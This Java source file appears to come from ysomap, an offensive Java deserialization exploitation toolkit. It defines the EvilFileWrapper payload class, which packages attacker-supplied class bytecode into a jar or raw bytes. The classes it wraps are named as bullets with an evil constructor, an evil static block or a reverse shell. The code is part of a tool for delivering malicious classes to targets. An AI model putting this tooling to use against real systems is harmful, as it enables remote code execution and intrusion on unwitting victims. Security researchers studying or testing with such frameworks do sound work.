package ysomap.payloads.java.objects;

import ysomap.bullets.Bullet;
import ysomap.bullets.objects.ClassWithEvilConstructor;
import ysomap.common.annotation.*;
import ysomap.core.serializer.Serializer;
import ysomap.core.util.ClassFiles;
import ysomap.payloads.AbstractPayload;

import java.util.HashMap;
import java.util.Map;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Targets({Targets.CODE})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"*"})
@Require(bullets = {"ClassWithEvilConstructor","ClassWithEvilStaticBlock", "ClassWithReverseShell","ClassWithEvilStaticBlockFromExistClazz"}, param = false)
public class EvilFileWrapper extends AbstractPayload<byte[]> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof byte[];
    }

    @Override
    public byte[] pack(Object obj) throws Exception {
        String type = bullet.get("type");
        if(type.equals("jar")){
            String classname = bullet.get("classname");
            Map<String, byte[]> classes = new HashMap<>();
            classes.put(classname, (byte[]) obj);
            return ClassFiles.makeJarWithMultiClazz(classname + ".jar", classes);
        }else {
            return (byte[]) obj;
        }
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ClassWithEvilConstructor.newInstance(args);
    }

    @Override
    public Serializer<?> getSerializer() {
        serializeType = "empty";
        return super.getSerializer();
    }
}
